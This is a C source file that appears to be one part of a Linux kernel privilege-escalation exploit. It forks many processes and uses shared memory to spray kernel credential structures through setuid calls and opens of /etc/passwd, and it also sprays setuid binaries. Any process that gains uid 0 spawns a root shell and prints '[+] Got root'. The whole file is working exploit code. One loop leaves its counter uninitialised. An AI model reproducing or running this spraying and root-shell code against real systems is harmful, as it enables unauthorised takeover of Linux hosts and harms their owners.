#include "cred.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/mman.h>

pthread_mutexattr_t attr = {0};
pthread_mutex_t *lock = NULL;
size_t spray_count = 0;
struct cred_shm *channel = NULL;

void init_setuid_mutex(void){
    pthread_mutexattr_init(&attr);
    pthread_mutexattr_setpshared(&attr, PTHREAD_PROCESS_SHARED);

	lock = mmap(NULL, sizeof(pthread_mutex_t), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pthread_mutex_init(lock, &attr);
}

void do_suid_binary(char *name){

    if(!channel){
        puts("[-] suid binary spray not initialized");
        exit(0);
    }

    puts("z");
    WAIT_STEP(channel, run_suid);
    puts("a");
    system(name);
    STEP_DONE(channel, run_suid_done);
    while(1) sleep(1000);
}

void suid_binary_spray(char *name, size_t count){
    int pid;

    for (size_t i = 0; i < count; i++) {
        if(!(pid = fork())){
            do_suid_binary(name);
        }
        if (pid < 0){
            perror("[-] fork");
        }
    }
}

void do_setuid(int swap){
	char *argv[] = {"/bin/sh", NULL};
    int success = 0;

    if(!lock || !channel || !spray_count){
        puts("[-] setuid spray not initialized");
        exit(0);
    }
	
	// Allocate new cred
    WAIT_STEP(channel, alloc_creds);
    pthread_mutex_lock(lock);
    puts("setuid");
	if(setuid(getuid()) < 0){
        perror("[-] setuid");
    }

    // Increase cred usage (swap mode only)
    int aux;
    if(swap){
        if((aux = open("/etc/passwd", 0)) < 0){
            perror("[-] Can't open aux file");
        }
    }

    pthread_mutex_unlock(lock);
    STEP_DONE(channel, alloc_creds_done);
    channel->alloc_creds_done++;

    // Decrease cred usage (swap mode only)
    if(swap){
        WAIT_STEP(channel, drop_usage);
        close(aux);
        STEP_DONE(channel, drop_usage_done);
    }

	// Check if root
    WAIT_STEP(channel, get_root);
	if(getuid() == 0){
		pthread_mutex_lock(lock);
        if(success){
            exit(0);
        }
        success = 1;
		setreuid(0, 0);
		puts("[+] Got root");
		execve("/bin/sh", (char * const*)&argv, NULL);
		pthread_mutex_unlock(lock);
	}
	exit(0);
}

void setuid_spray(size_t count, int swap){
    if(!lock || !channel){
        puts("[-] setuid spray not initialized");
    }

    spray_count = count;
    int pid;
    for (size_t i; i < count; i++) {
        if(!(pid = fork())){
            do_setuid(swap);
        }
        if (pid < 0){
            perror("[-] fork");
        }
    }
}

struct cred_shm *init_setuid(void){
    int shmid = shmget(IPC_PRIVATE, PAGE_SIZE, IPC_CREAT| 0666);
    if (shmid < 0) {
        perror("[-] shmget");
    }
    channel = (struct cred_shm *)shmat(shmid, NULL, 0);

    init_setuid_mutex();

    return channel;
}